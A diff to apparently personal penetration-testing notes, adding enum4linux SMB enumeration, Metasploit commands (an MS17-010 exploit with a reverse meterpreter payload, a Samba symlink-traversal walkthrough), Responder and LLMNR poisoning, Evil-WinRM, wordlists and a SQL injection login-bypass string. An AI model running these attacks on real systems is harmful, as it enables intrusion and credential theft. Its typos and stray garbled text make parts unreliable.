@@ -268,6 +268,11 @@ Network:
         
         (h) <Lua scripts> is a comma-separated list of script-files orscript-categories.
 
+        (i) Some Scripts:
+
+            (a) `vuln`: A General Script for Scanning for Vunerabilites
+            (b) `smb-enum-users.nse`: Gathers Information about The user on the Target machine which uses SMB Protocol (445 for Microsoft-DS)
+
     (xiii) OUTPUT:
 
         (a) `-oN/-oX/-oS/-oG <file>`:  Output scan in normal, XML, s|<rIpt kIddi3, and Grepable format, respectively, to the given filename.
@@ -424,7 +429,53 @@ Network:
             https://netnut.io/free-proxy-list/
             https://spys.one/
 
-7. 
+7. SMB
+
+    (i) Enum4Linux (SMB)
+
+        (a) Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com). Some additional features such as RID cycling have also been added for convenience.
+
+        (b) Gathers Information About The Target Machine Running `SMB` protocol
+
+        (c) Syntax:
+
+            $ enum4linux <options> <IP>
+
+        (d) Options:
+
+            (I)    -U        get userlist
+            (II)   -M        get machine list*
+            (III)  -S        get sharelist
+            (IV)   -P        get password policy information
+            (V)    -G        get group and member list
+            (VI)   -d        be detailed, applies to -U and -S
+            (VII)  -u user   specify username to use (default "")  
+            (VIII) -p pass   specify password to use (default "")   
+
+        (e) The following options from enum.exe aren't implemented: -L, -N, -D, -f
+
+        (f) Additional options:
+
+            (I)    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i). This option is enabled if you don't provide any other options.
+            (II)   -h        Display this help message and exit
+            (III)  -r        enumerate users via RID cycling
+            (IV)   -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
+            (V)    -K n      Keep searching RIDs until n consective RIDs don't correspond to a username.  Impies RID range ends at 999999. Useful against DCs.
+            (VI)   -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
+            (VII)  -s file   brute force guessing for share names
+            (VIII) -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none) Used to get sid with "lookupsid known_username" Use commas to try several users: "-k admin,user1,user2"
+            (IX)   -o        Get OS information
+            (X)    -i        Get printer information
+            (XI)   -w wrkg   Specify workgroup manually (usually found automatically)
+            (XII)  -n        Do an nmblookup (similar to nbtstat)
+            (XIII) -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
+            (XIV)  -A        Aggressive. Do write checks on shares etc
+
+        (g) About
+            
+            (I) RID cycling should extract a list of users from Windows (or Samba) hosts which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network access: Allow anonymous SID/Name translation" enabled (XP, 2003).
+            (II) NB: Samba servers often seem to have RIDs in the range 3000-3050.
+            (III) Dependancy info: You will need to have the samba package installed as this script is basically just a wrapper around rpcclient, net, nmblookup and smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ is required to get Password Policy info.
 
 Brute Force:
 
@@ -994,11 +1045,155 @@ Brute Force:
 
 10. WorldLists
 
-    (i) `rockyou.txt` /usr/share/wordlists
+    (i) `rockyou.txt` /usr/share/wordlists/rockyou.txt 14 million
+    (ii) Seclists
 
-Vunerabilites
+        (a) sudo apt install seclists
+        (b) /usr/share/wordlists/seclists/
+        (b) /usr/share/wordlists/seclists/Usernames/
+        (b) /usr/share/wordlists/seclists/Passwords/
+        (b) /usr/share/wordlists/seclists/Discovery/
 
-10. Telnet
+Other:
+
+11. Metasploit Framework
+
+    (i) Metasploit is a Framework with containing Many Exploits for certain things, used for Attacking and checking if the machine is vunerable to the exploits and attacks
+
+    (ii) Start
+
+        $ sudo msfconsole
+
+    (ii) Commands:
+
+        (a) `search <protocol>` search for exploits
+
+            msf6> search smb
+
+        (b) `grep <text> seach <protocol>` Filter through the search results by only showing matching lines
+
+            # Search for Exploits
+            msf6> grep exploit seach smb
+
+        (c) `use <exploit>` use the specified exploit
+
+            msf6> use auxiliary/scanner/smb/smb_ms17_010
+            msf6> use exploit/windows/smb/ms17_010_psexec
+
+    (iii) Exploit Commands
+        
+        (a) `show options` show all the options (they are key-value pair)
+            
+            msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+            msf6 exploit(windows/smb/ms17_010_psexec) > show options
+
+        (b) `set <option> <value>` changes an option to value,
+            
+            (press `TAB` to show all the possible values Doesn't work for some options like RHOSTS)
+
+            msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.150
+            msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_http
+
+        (c) `run` Check if it's vunerable
+
+        (d) `exploit` Uses The Exploit
+
+        (d) Some Common Options:
+
+            (I) `RHOSTS` The Target machine
+            (II) `RPORT` The Target Port
+            (III) `payload` The Target Port
+
+    (iv) use Cases
+
+        (a) SMB Root Access
+
+            $ sudo msfconsole
+            msf6> use auxiliary/admin/smb/samba_symlink_traversal
+            msf6 auxiliary(admin/smb/samba_symlink_traversal) > set RHOSTS 192.168.1.159
+            msf6 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
+            msf6 auxiliary(admin/smb/samba_symlink_traversal) > exploit
+            msf6 auxiliary(admin/smb/samba_symlink_traversal) > exit
+            $ smbclient //192.168.1.159/tmp
+
+12. Name Service Poisoning
+
+    (a) `Responder`
+
+        (i) A Tools Used for LLMNR, NBT-NS, MDNS, DNS Poisoning
+
+        (ii) Flags:
+            
+            () -I <interface>, --interface=<interface>: Network interface to use, you can use 'ALL' as a wildcard for all interfaces
+
+            () `-A, --analyze:        Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.
+            () `-i <IPv4>, --ip=<IPv4>: Local IP to use (only for OSX)
+            () `-6 <IPv6>, --externalip6=<IPv6>: Poison all requests with another IPv6 address than Responder's one.
+            () `-e 10.0.0.22, --externalip=10.0.0.22 Poison all requests with another IP address than Responder's one.
+            
+            () `-b, --basic:           Return a Basic HTTP authentication. Default: NTLM
+            () `-d, --DHCP:            Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False
+            () `-D, --DHCP-DNS:        This option will inject a DNS server in the DHCP response, otherwise a WPAD server will be added. Default: False
+            () `-w, --wpad:            Start the WPAD rogue proxy server. Default value is False
+            () `-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY: Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)
+            () `-F, --ForceWpadAuth:   Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False
+            () `-P, --ProxyAuth:       Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective. Default: False
+            () `-Q, --quiet:           Tell Responder to be quiet, disables a bunch of printing from the poisoners. Default: False
+            () `--lm:                  Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False
+            () `--disable-ess:         Force ESS downgrade. Default: False
+            () `-v, --verbose:         Increase verbosity.
+            () `--version:             version
+            () `-h, --help:            help
+
+        (iii) Example:
+
+            $ sudo responder -I eth0
+    
+13. Windows
+
+    (i) Evil WinRM
+        
+        (a) WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.
+
+        (b) Install
+
+            # gem is the Package Manager for Programming Language Ruby
+            $ gem install evil-winrm
+
+        (c) Syntax:
+
+            $ evil-winrm -i <IP> -u <User> <Optional Flags?...>
+
+        (c) Flags:
+
+            Required:
+            
+            (I) -i, --ip <IP>                      Remote host IP or hostname. FQDN for Kerberos auth (required)
+            (II) -u, --user <USER>                  Username (required if not using kerberos)
+
+            Optional:
+
+            (III)  -S, --ssl                        Enable ssl
+            (IV)   -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+            (V)    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+            (VI)   -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
+            (VII)  -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+            (VIII)     --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+            (IX)   -e, --executables EXES_PATH      C# executables local path
+            (X)    -U, --url URL                    Remote url endpoint (default /wsman)
+            (XI)   -p, --password PASS              Password
+            (XII)  -H, --hash HASH                  NTHash
+            (XIII) -P, --port PORT                  Remote host port (default 5985)
+            (XIV)  -V, --version                    Show version
+            (XV)   -n, --no-colors                  Disable colors
+            (XVI)  -N, --no-rpath-completion        Disable remote path completion
+            (XVII) -l, --log                        Log the WinRM session
+
+            (XVIII) -h, --help                       Help
+
+Vunerabilites:
+
+12. Telnet
 
     (i) In Linux-based distributions Telnet could be bypassed by just entering username "root", if not properly Configured
 
@@ -1008,7 +1203,7 @@ Vunerabilites
 
         root@machine~#
 
-11. FTP
+13. FTP
 
     (i) username "anonymous" let's you login without having an account
 
@@ -1016,13 +1211,13 @@ Vunerabilites
     username: anonymous
     password: 123
 
-12. MariSQL
+14. MariSQL
 
     (a) username `root` allows us to log into this MariaDB instance without providing a password. 
 
     $ mysql -u root -h <IP>
 
-13. SQL Injection
+15. SQL Injection
 
     (a) SQL injection can be done if a Website Uses SQL and doesn't properly Sanitize Their User Input such websites are Vunerable to SQL Injections and SQL Injections are done with with simple SQL Query. This doesn't work with Websites that were built properly
 
@@ -1030,5 +1225,16 @@ Vunerabilites
         
         admin' OR '1'='1' -- 
 
-14. SMB
+16. LLMNR Poisoning/NBT-NS
 
+    (a) Local-Link Multicast Name Resolution (LLMNR) is a Protocol Based on The Domain Name System (DNS) that allowed both IPv4 and IPv6 to perform name Resolution on the same local link it's used in Windows Vista, Windows 7 / Server 2008, Windows 10. it is also implemented by systemd-resolved on linux, however it is not accepted as a Standard by Internet Engineering Task Force (IETF)
+
+    (b) How LLMNS works is that it The "Target Machine" asks everyone on the same network if They know Where that Address is, If a Machine knows where that address is then It responds back to the Target Machine, This is where the "Hacker" come in, they tell the Target Machine that he knows wherer that Address is but asks for The "Hash" File on The Target Machine and it Responds back with the Hash File. This way of Getting Unauthorized Information is known as LLMNS Poisioning
+
+    (c) NetBIOS, NBT-NS identifies systems on a local network by their NetBIOS name.
+
+17. MultiCast DNS
+
+18. Cross-Site Request Forgery (CSRF)
+
+19. Cross-Site Scripting (XSS)
